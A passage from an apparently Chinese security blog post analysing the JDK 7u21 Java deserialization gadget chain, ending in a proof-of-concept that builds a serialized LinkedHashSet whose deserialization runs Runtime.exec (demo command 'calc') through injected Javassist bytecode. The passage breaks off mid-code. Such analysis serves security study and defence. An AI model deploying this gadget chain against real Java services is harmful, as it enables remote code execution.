        <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">var4</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">"annotationType"</span><span class="o">))</span> <span class="o">{</span>
            <span class="k">return</span> <span class="k">this</span><span class="o">.</span><span class="na">type</span><span class="o">;</span>
        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
            <span class="n">Object</span> <span class="n">var6</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">memberValues</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">var4</span><span class="o">);</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">var6</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                <span class="k">throw</span> <span class="k">new</span> <span class="n">IncompleteAnnotationException</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">type</span><span class="o">,</span> <span class="n">var4</span><span class="o">);</span>
            <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">var6</span> <span class="k">instanceof</span> <span class="n">ExceptionProxy</span><span class="o">)</span> <span class="o">{</span>
                <span class="k">throw</span> <span class="o">((</span><span class="n">ExceptionProxy</span><span class="o">)</span><span class="n">var6</span><span class="o">).</span><span class="na">generateException</span><span class="o">();</span>
            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">var6</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">isArray</span><span class="o">()</span> <span class="o">&amp;&amp;</span> <span class="n">Array</span><span class="o">.</span><span class="na">getLength</span><span class="o">(</span><span class="n">var6</span><span class="o">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
                    <span class="n">var6</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">cloneArray</span><span class="o">(</span><span class="n">var6</span><span class="o">);</span>
                <span class="o">}</span>

                <span class="k">return</span> <span class="n">var6</span><span class="o">;</span>
            <span class="o">}</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p><code>Annotationinvocationhandler</code> 类 <code>invoke</code> 方法的调用涉及 <code>Java</code> 的动态代理机制，动态代理这里不再详细叙述，直构造代码:</p>
<div class="highlight"><pre><span></span><span class="n">TemplatesImpl</span> <span class="n">templatesImpl</span> <span class="o">=</span> <span class="n">createTemplatesImpl</span><span class="o">(</span><span class="s">"calc"</span><span class="o">,</span> <span class="n">TemplatesImpl</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">AbstractTranslet</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">TransformerFactoryImpl</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>

<span class="n">HashMap</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
<span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">zeroHashCodeStr</span><span class="o">,</span> <span class="s">"sss"</span><span class="o">);</span>

<span class="c1">// 使用 Reflections 反射框架创建 AnnotationInvocationHandler 对象，并设置 type 和 memberValues 字段值</span>
<span class="n">InvocationHandler</span> <span class="n">tempHandler</span> <span class="o">=</span> <span class="o">(</span><span class="n">InvocationHandler</span><span class="o">)</span> <span class="n">Reflections</span><span class="o">.</span><span class="na">getFirstCtor</span><span class="o">(</span><span class="s">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="o">).</span>
                <span class="n">newInstance</span><span class="o">(</span><span class="n">Templates</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">map</span><span class="o">);</span>

<span class="kd">final</span> <span class="n">Class</span><span class="o">&lt;?&gt;[]</span> <span class="n">allIfaces</span> <span class="o">=</span> <span class="o">(</span><span class="n">Class</span><span class="o">&lt;?&gt;[])</span> <span class="n">Array</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">Class</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="mi">1</span><span class="o">);</span>
<span class="n">allIfaces</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">=</span> <span class="n">Templates</span><span class="o">.</span><span class="na">class</span><span class="o">;</span>

<span class="c1">//  生成代理类，实现 Templates 接口，代理对象为创建的 AnnotationInvocationHandler 对象</span>
<span class="n">Templates</span> <span class="n">templates</span> <span class="o">=</span> <span class="o">(</span><span class="n">Templates</span><span class="o">)</span><span class="n">Proxy</span><span class="o">.</span><span class="na">newProxyInstance</span><span class="o">(</span><span class="n">JDK7u21</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getClassLoader</span><span class="o">(),</span> <span class="n">allIfaces</span><span class="o">,</span> <span class="n">tempHandler</span><span class="o">);</span>

<span class="n">templates</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">templatesImpl</span><span class="o">);</span>
</pre></div>
<p>通过执行 <code>templates.equals(templatesImpl);</code> 最终触发我们想要执行的语句.</p>
<h3 data-content="1" id="6e4ba11ed0d65f332ac0bda02ca8a0ed"><strong><em>HashMap class</em></strong></h3>
<p>通过以上我们知道，最终需要调用 <code>templates.equals(templatesImpl);</code> 才能触发我们想要执行的语句.</p>
<p>在 <code>HashMap</code> 的 <code>put</code> 方法中存在 <code>key.equals(k)</code> 语句，如果 <code>key</code> 为 <code>templates</code> 对象，<code>k</code> 为 <code>templatesImpl</code> 对象，则正好触发我们构造的调用链.但是执行 <code>key.equals(k)</code> 语句需要有前提条件:</p>
<p>1、HashMap 存入两个 key 的 hash 值相等，并且 indexFor 计算的 i 相等;</p>
<p>2、前一个 HashMap 对象值的 key 值不等于现在存入的 key 值;</p>
<p>3、现在存入的 key 值为 templates 对象，上一个存入的 key 值为 templatesImpl 对象.</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="n">V</span> <span class="nf">put</span><span class="o">(</span><span class="n">K</span> <span class="n">key</span><span class="o">,</span> <span class="n">V</span> <span class="n">value</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">key</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span>
        <span class="k">return</span> <span class="n">putForNullKey</span><span class="o">(</span><span class="n">value</span><span class="o">);</span>
    <span class="kt">int</span> <span class="n">hash</span> <span class="o">=</span> <span class="n">hash</span><span class="o">(</span><span class="n">key</span><span class="o">);</span>
    <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="n">indexFor</span><span class="o">(</span><span class="n">hash</span><span class="o">,</span> <span class="n">table</span><span class="o">.</span><span class="na">length</span><span class="o">);</span>
    <span class="k">for</span> <span class="o">(</span><span class="n">Entry</span><span class="o">&lt;</span><span class="n">K</span><span class="o">,</span><span class="n">V</span><span class="o">&gt;</span> <span class="n">e</span> <span class="o">=</span> <span class="n">table</span><span class="o">[</span><span class="n">i</span><span class="o">];</span> <span class="n">e</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">;</span> <span class="n">e</span> <span class="o">=</span> <span class="n">e</span><span class="o">.</span><span class="na">next</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">Object</span> <span class="n">k</span><span class="o">;</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">e</span><span class="o">.</span><span class="na">hash</span> <span class="o">==</span> <span class="n">hash</span> <span class="o">&amp;&amp;</span> <span class="o">((</span><span class="n">k</span> <span class="o">=</span> <span class="n">e</span><span class="o">.</span><span class="na">key</span><span class="o">)</span> <span class="o">==</span> <span class="n">key</span> <span class="o">||</span> <span class="n">key</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">k</span><span class="o">)))</span> <span class="o">{</span>
            <span class="n">V</span> <span class="n">oldValue</span> <span class="o">=</span> <span class="n">e</span><span class="o">.</span><span class="na">value</span><span class="o">;</span>
            <span class="n">e</span><span class="o">.</span><span class="na">value</span> <span class="o">=</span> <span class="n">value</span><span class="o">;</span>
            <span class="n">e</span><span class="o">.</span><span class="na">recordAccess</span><span class="o">(</span><span class="k">this</span><span class="o">);</span>
            <span class="k">return</span> <span class="n">oldValue</span><span class="o">;</span>
        <span class="o">}</span>
    <span class="o">}</span>

    <span class="n">modCount</span><span class="o">++;</span>
    <span class="n">addEntry</span><span class="o">(</span><span class="n">hash</span><span class="o">,</span> <span class="n">key</span><span class="o">,</span> <span class="n">value</span><span class="o">,</span> <span class="n">i</span><span class="o">);</span>
    <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
<span class="o">}</span>
</pre></div>
<p>所以我们可以进行像这样构造. 但是发现前提条件 <code>1</code> 并没有满足，所以需要看一下 <code>hash</code> 方法.</p>
<div class="highlight"><pre><span></span><span class="n">HashMap</span> <span class="n">hashmap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
    <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">templatesImpl</span><span class="o">,</span> <span class="s">"templatesImpl"</span><span class="o">);</span>
    <span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span> <span class="s">"templates"</span><span class="o">);</span>
</pre></div>
<p><code>hash</code> 方法中实际调用了传入 <code>k</code> 的 <code>hashCode</code> 方法. 所以实际调用的是 <code>templatesImpl</code> 和 <code>templates</code> 对象的 <code>hashCode</code> 方法.</p>
<div class="highlight"><pre><span></span><span class="kd">final</span> <span class="kt">int</span> <span class="nf">hash</span><span class="o">(</span><span class="n">Object</span> <span class="n">k</span><span class="o">)</span> <span class="o">{</span>
    <span class="kt">int</span> <span class="n">h</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">useAltHashing</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">k</span> <span class="k">instanceof</span> <span class="n">String</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">return</span> <span class="n">sun</span><span class="o">.</span><span class="na">misc</span><span class="o">.</span><span class="na">Hashing</span><span class="o">.</span><span class="na">stringHash32</span><span class="o">((</span><span class="n">String</span><span class="o">)</span> <span class="n">k</span><span class="o">);</span>
        <span class="o">}</span>
        <span class="n">h</span> <span class="o">=</span> <span class="n">hashSeed</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="n">h</span> <span class="o">^=</span> <span class="n">k</span><span class="o">.</span><span class="na">hashCode</span><span class="o">();</span>

    <span class="c1">// This function ensures that hashCodes that differ only by</span>
    <span class="c1">// constant multiples at each bit position have a bounded</span>
    <span class="c1">// number of collisions (approximately 8 at default load factor).</span>
    <span class="n">h</span> <span class="o">^=</span> <span class="o">(</span><span class="n">h</span> <span class="o">&gt;&gt;&gt;</span> <span class="mi">20</span><span class="o">)</span> <span class="o">^</span> <span class="o">(</span><span class="n">h</span> <span class="o">&gt;&gt;&gt;</span> <span class="mi">12</span><span class="o">);</span>
    <span class="k">return</span> <span class="n">h</span> <span class="o">^</span> <span class="o">(</span><span class="n">h</span> <span class="o">&gt;&gt;&gt;</span> <span class="mi">7</span><span class="o">)</span> <span class="o">^</span> <span class="o">(</span><span class="n">h</span> <span class="o">&gt;&gt;&gt;</span> <span class="mi">4</span><span class="o">);</span>
<span class="o">}</span>
</pre></div>
<p><code>TemplatesImpl</code> 类没有重写 <code>hashCode</code> 方法，调用默认的 <code>hashCode</code> 方法.<code>templates</code> 对象对应的代理类重写了 <code>hashCode</code> 方法，实际调用 <code>AnnotationInvocationHandler</code> 类的 <code>hashCodeImpl</code> 方法.分析一下这个方法, 发现这个方法会遍历 <code>this.memberValues</code>，每次用上一次计算的值加上 <code>127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())</code>，而 <code>memberValueHashCode</code> 方法中知道，如果 <code>this.memberValues</code> 值的 <code>value</code> 值的类不是数组，就会返回该 <code>value</code> 值的 <code>hashCode</code> 值.如果 <code>this.memberValues</code> 只有一个 <code>map</code> 对象，并且 <code>127 * ((String)var3.getKey()).hashCode()</code> 计算的值为零，<code>map</code> 对象的 <code>value</code> 值为 <code>templatesImpl</code> 对象时，能够使得 <code>HashMap</code> 两次 <code>put</code> 值的 <code>key</code> 值相等.所以在创建 <code>AnnotationInvocationHandler</code> 对象时，传入的 <code>map</code> 对象，<code>key</code> 的 <code>hashCode</code> 值应该为零，<code>value</code> 值为 <code>templatesImpl</code> 对象.</p>
<div class="highlight"><pre><span></span><span class="kd">private</span> <span class="kt">int</span> <span class="nf">hashCodeImpl</span><span class="o">()</span> <span class="o">{</span>
    <span class="kt">int</span> <span class="n">var1</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>

    <span class="n">Entry</span> <span class="n">var3</span><span class="o">;</span>
    <span class="k">for</span><span class="o">(</span><span class="n">Iterator</span> <span class="n">var2</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">memberValues</span><span class="o">.</span><span class="na">entrySet</span><span class="o">().</span><span class="na">iterator</span><span class="o">();</span> <span class="n">var2</span><span class="o">.</span><span class="na">hasNext</span><span class="o">();</span> <span class="n">var1</span> <span class="o">+=</span> <span class="mi">127</span> <span class="o">*</span> <span class="o">((</span><span class="n">String</span><span class="o">)</span><span class="n">var3</span><span class="o">.</span><span class="na">getKey</span><span class="o">()).</span><span class="na">hashCode</span><span class="o">()</span> <span class="o">^</span> <span class="n">memberValueHashCode</span><span class="o">(</span><span class="n">var3</span><span class="o">.</span><span class="na">getValue</span><span class="o">()))</span> <span class="o">{</span>
        <span class="n">var3</span> <span class="o">=</span> <span class="o">(</span><span class="n">Entry</span><span class="o">)</span><span class="n">var2</span><span class="o">.</span><span class="na">next</span><span class="o">();</span>
    <span class="o">}</span>

    <span class="k">return</span> <span class="n">var1</span><span class="o">;</span>
<span class="o">}</span>
</pre></div>
<p>这时我们构造的代码如下:</p>
<div class="highlight"><pre><span></span><span class="n">TemplatesImpl</span> <span class="n">templatesImpl</span> <span class="o">=</span> <span class="n">createTemplatesImpl</span><span class="o">(</span><span class="s">"calc"</span><span class="o">,</span> <span class="n">TemplatesImpl</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">AbstractTranslet</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">TransformerFactoryImpl</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>

<span class="n">String</span> <span class="n">zeroHashCodeStr</span> <span class="o">=</span> <span class="s">"f5a5a608"</span><span class="o">;</span>

<span class="n">HashMap</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
<span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">zeroHashCodeStr</span><span class="o">,</span> <span class="n">templatesImpl</span><span class="o">);</span>

<span class="n">System</span><span class="o">.</span><span class="na">getProperties</span><span class="o">().</span><span class="na">put</span><span class="o">(</span><span class="s">"sun.misc.ProxyGenerator.saveGeneratedFiles"</span><span class="o">,</span> <span class="s">"true"</span><span class="o">);</span>

<span class="n">InvocationHandler</span> <span class="n">tempHandler</span> <span class="o">=</span> <span class="o">(</span><span class="n">InvocationHandler</span><span class="o">)</span> <span class="n">Reflections</span><span class="o">.</span><span class="na">getFirstCtor</span><span class="o">(</span><span class="s">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="o">).</span>
        <span class="n">newInstance</span><span class="o">(</span><span class="n">Templates</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">map</span><span class="o">);</span>

<span class="kd">final</span> <span class="n">Class</span><span class="o">&lt;?&gt;[]</span> <span class="n">allIfaces</span> <span class="o">=</span> <span class="o">(</span><span class="n">Class</span><span class="o">&lt;?&gt;[])</span> <span class="n">Array</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">Class</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="mi">1</span><span class="o">);</span>
<span class="n">allIfaces</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">=</span> <span class="n">Templates</span><span class="o">.</span><span class="na">class</span><span class="o">;</span>
<span class="n">Templates</span> <span class="n">templates</span> <span class="o">=</span> <span class="o">(</span><span class="n">Templates</span><span class="o">)</span><span class="n">Proxy</span><span class="o">.</span><span class="na">newProxyInstance</span><span class="o">(</span><span class="n">JDK7u21</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getClassLoader</span><span class="o">(),</span> <span class="n">allIfaces</span><span class="o">,</span> <span class="n">tempHandler</span><span class="o">);</span>

<span class="n">HashMap</span> <span class="n">hashmap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
<span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">templatesImpl</span><span class="o">,</span> <span class="s">"templatesImpl"</span><span class="o">);</span>
<span class="n">hashmap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span> <span class="s">"templates"</span><span class="o">);</span>
</pre></div>
<h3 data-content="1" id="f61c66080ce01b46f3caad74591a7c46"><strong><em>LinkedHashSet class</em></strong></h3>
<p>我们最终是要通过反序列化里触发我们的调用链，所以我们需要在 <code>readObject</code> 反序列化方法中寻找是否有调用 <code>map</code> 的 <code>put</code> 方法.在 <code>HashSet</code> 的 <code>readObject</code> 反序列化方法中会循环往 <code>map</code> 对象中 <code>put</code> 值.根据 <code>writeObject</code> 序列化我们知道，每次写入的对象为 <code>map</code> 的 <code>key</code> 值.所以我们创建的 <code>LinkedHashSet</code> 对象时，首先写入 <code>templatesImpl</code> 对象，然后写入 <code>templates</code>.然后调用 <code>writeObject</code> 写入 <code>LinkedHashSet</code> 对象.使用 <code>LinkedHashSet</code> 来添加值是因为 <code>LinkedHashSet</code> 能够保证值的加入顺序.</p>
<div class="highlight"><pre><span></span><span class="kd">private</span> <span class="kt">void</span> <span class="nf">readObject</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">ObjectInputStream</span> <span class="n">s</span><span class="o">)</span>
    <span class="kd">throws</span> <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">IOException</span><span class="o">,</span> <span class="n">ClassNotFoundException</span> <span class="o">{</span>
    <span class="c1">// Read in any hidden serialization magic</span>
    <span class="n">s</span><span class="o">.</span><span class="na">defaultReadObject</span><span class="o">();</span>

    <span class="c1">// Read in HashMap capacity and load factor and create backing HashMap</span>
    <span class="kt">int</span> <span class="n">capacity</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="na">readInt</span><span class="o">();</span>
    <span class="kt">float</span> <span class="n">loadFactor</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="na">readFloat</span><span class="o">();</span>
    <span class="n">map</span> <span class="o">=</span> <span class="o">(((</span><span class="n">HashSet</span><span class="o">)</span><span class="k">this</span><span class="o">)</span> <span class="k">instanceof</span> <span class="n">LinkedHashSet</span> <span class="o">?</span>
           <span class="k">new</span> <span class="n">LinkedHashMap</span><span class="o">&lt;</span><span class="n">E</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;(</span><span class="n">capacity</span><span class="o">,</span> <span class="n">loadFactor</span><span class="o">)</span> <span class="o">:</span>
           <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">E</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;(</span><span class="n">capacity</span><span class="o">,</span> <span class="n">loadFactor</span><span class="o">));</span>

    <span class="c1">// Read in size</span>
    <span class="kt">int</span> <span class="n">size</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="na">readInt</span><span class="o">();</span>

    <span class="c1">// Read in all elements in the proper order.</span>
    <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="o">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="n">size</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
        <span class="n">E</span> <span class="n">e</span> <span class="o">=</span> <span class="o">(</span><span class="n">E</span><span class="o">)</span> <span class="n">s</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
        <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">e</span><span class="o">,</span> <span class="n">PRESENT</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<h2 data-content="1" id="a1d0dff35044d829506b6059977932e1"><strong>POC</strong></h2>
<p>最终 POC 如下：</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">JDK7u21</span> <span class="o">{</span>

<span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>

    <span class="n">TemplatesImpl</span> <span class="n">templatesImpl</span> <span class="o">=</span> <span class="n">createTemplatesImpl</span><span class="o">(</span><span class="s">"calc"</span><span class="o">,</span> <span class="n">TemplatesImpl</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">AbstractTranslet</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">TransformerFactoryImpl</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>

    <span class="n">String</span> <span class="n">zeroHashCodeStr</span> <span class="o">=</span> <span class="s">"f5a5a608"</span><span class="o">;</span>

    <span class="n">HashMap</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
    <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">zeroHashCodeStr</span><span class="o">,</span> <span class="s">"ssss"</span><span class="o">);</span>

    <span class="n">System</span><span class="o">.</span><span class="na">getProperties</span><span class="o">().</span><span class="na">put</span><span class="o">(</span><span class="s">"sun.misc.ProxyGenerator.saveGeneratedFiles"</span><span class="o">,</span> <span class="s">"true"</span><span class="o">);</span>

    <span class="n">InvocationHandler</span> <span class="n">tempHandler</span> <span class="o">=</span> <span class="o">(</span><span class="n">InvocationHandler</span><span class="o">)</span> <span class="n">Reflections</span><span class="o">.</span><span class="na">getFirstCtor</span><span class="o">(</span><span class="s">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="o">).</span>
            <span class="n">newInstance</span><span class="o">(</span><span class="n">Templates</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">map</span><span class="o">);</span>

    <span class="kd">final</span> <span class="n">Class</span><span class="o">&lt;?&gt;[]</span> <span class="n">allIfaces</span> <span class="o">=</span> <span class="o">(</span><span class="n">Class</span><span class="o">&lt;?&gt;[])</span> <span class="n">Array</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">Class</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="mi">1</span><span class="o">);</span>
    <span class="n">allIfaces</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">=</span> <span class="n">Templates</span><span class="o">.</span><span class="na">class</span><span class="o">;</span>
    <span class="n">Templates</span> <span class="n">templates</span> <span class="o">=</span> <span class="o">(</span><span class="n">Templates</span><span class="o">)</span><span class="n">Proxy</span><span class="o">.</span><span class="na">newProxyInstance</span><span class="o">(</span><span class="n">JDK7u21</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getClassLoader</span><span class="o">(),</span> <span class="n">allIfaces</span><span class="o">,</span> <span class="n">tempHandler</span><span class="o">);</span>

    <span class="n">LinkedHashSet</span> <span class="n">set</span> <span class="o">=</span> <span class="k">new</span> <span class="n">LinkedHashSet</span><span class="o">();</span>
    <span class="n">set</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">templatesImpl</span><span class="o">);</span>
    <span class="n">set</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">templates</span><span class="o">);</span>

    <span class="c1">// 此处将 key 为 "f5a5a608" 的 map 对象的 value 值设置为 templatesImpl 是因为如果在 set.add(templates) 之前设置，则会令 LinkedHashSet 两次增加的 hash 值相等，在写入序列化对象前触发调用链. </span>
    <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">zeroHashCodeStr</span><span class="o">,</span> <span class="n">templatesImpl</span><span class="o">);</span>


    <span class="c1">//序列化</span>
    <span class="n">ObjectOutputStream</span> <span class="n">objectOutputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileOutputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="s">"D://JDK7u21.ser"</span><span class="o">)));</span>
    <span class="n">objectOutputStream</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">set</span><span class="o">);</span><span class="c1">//序列化对象</span>
    <span class="n">objectOutputStream</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span>
    <span class="n">objectOutputStream</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>


    <span class="n">ObjectInputStream</span> <span class="n">objectInputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="s">"D://JDK7u21.ser"</span><span class="o">));</span>
    <span class="n">objectInputStream</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
<span class="o">}</span>


<span class="kd">public</span> <span class="kd">static</span> <span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span> <span class="n">T</span> <span class="nf">createTemplatesImpl</span> <span class="o">(</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">command</span><span class="o">,</span> <span class="n">Class</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span> <span class="n">tplClass</span><span class="o">,</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">abstTranslet</span><span class="o">,</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">transFactory</span> <span class="o">)</span>
        <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
    <span class="kd">final</span> <span class="n">T</span> <span class="n">templates</span> <span class="o">=</span> <span class="n">tplClass</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
    <span class="c1">// use template gadget class</span>
    <span class="n">ClassPool</span> <span class="n">pool</span> <span class="o">=</span> <span class="n">ClassPool</span><span class="o">.</span><span class="na">getDefault</span><span class="o">();</span>
    <span class="c1">// 新增搜索路径到 pathList 中</span>
    <span class="n">pool</span><span class="o">.</span><span class="na">insertClassPath</span><span class="o">(</span><span class="k">new</span> <span class="n">ClassClassPath</span><span class="o">(</span><span class="n">Foo</span><span class="o">.</span><span class="na">class</span><span class="o">));</span>
    <span class="n">pool</span><span class="o">.</span><span class="na">insertClassPath</span><span class="o">(</span><span class="k">new</span> <span class="n">ClassClassPath</span><span class="o">(</span><span class="n">abstTranslet</span><span class="o">));</span>
    <span class="c1">// 先后从缓存和 pathList 中寻找 Foo 类，返回 CtClass 对象</span>
    <span class="kd">final</span> <span class="n">CtClass</span> <span class="n">clazz</span> <span class="o">=</span> <span class="n">pool</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">Foo</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
    <span class="c1">// 构造静态初始化语句，后面用到</span>
    <span class="n">String</span> <span class="n">cmd</span> <span class="o">=</span> <span class="s">"java.lang.Runtime.getRuntime().exec(\""</span> <span class="o">+</span>
            <span class="n">command</span><span class="o">.</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">"\\\\"</span><span class="o">,</span><span class="s">"\\\\\\\\"</span><span class="o">).</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">"\""</span><span class="o">,</span> <span class="s">"\\\""</span><span class="o">)</span> <span class="o">+</span>
            <span class="s">"\");"</span><span class="o">;</span>
    <span class="c1">// 在类中设置静态初始化语句</span>
    <span class="n">clazz</span><span class="o">.</span><span class="na">makeClassInitializer</span><span class="o">().</span><span class="na">insertBefore</span><span class="o">(</span><span class="n">cmd</span><span class="o">);</span>
    <span class="c1">// 设置类名</span>
    <span class="n">clazz</span><span class="o">.</span><span class="na">setName</span><span class="o">(</span><span class="s">"com.Pwner"</span><span class="o">);</span>
    <span class="c1">// 先后从缓存和 pathList 中寻找 abstTranslet 类，返回 CtClass 对象</span>
    <span class="n">CtClass</span> <span class="n">superC</span> <span class="o">=</span> <span class="n">pool</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">abstTranslet</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
    <span class="c1">// 设置父类为 abstTranslet</span>
    <span class="n">clazz</span><span class="o">.</span><span class="na">setSuperclass</span><span class="o">(</span><span class="n">superC</span><span class="o">);</span>
    <span class="c1">// 将类转换为二进制</span>
    <span class="kd">final</span> <span class="kt">byte</span><span class="o">[]</span> <span class="n">classBytes</span> <span class="o">=</span> <span class="n">clazz</span><span class="o">.</span><span class="na">toBytecode</span><span class="o">();</span>

    <span class="cm">/*InputStream in = new FileInputStream("F:\\Foo.class");</span>
<span class="cm">    byte[] data = toByteArray(in);*/</span>

    <span class="c1">// 使用 Reflections 反射框架为 _bytecodes 字段赋值</span>
    <span class="n">Reflections</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span> <span class="s">"_bytecodes"</span><span class="o">,</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[][]</span> <span class="o">{</span>
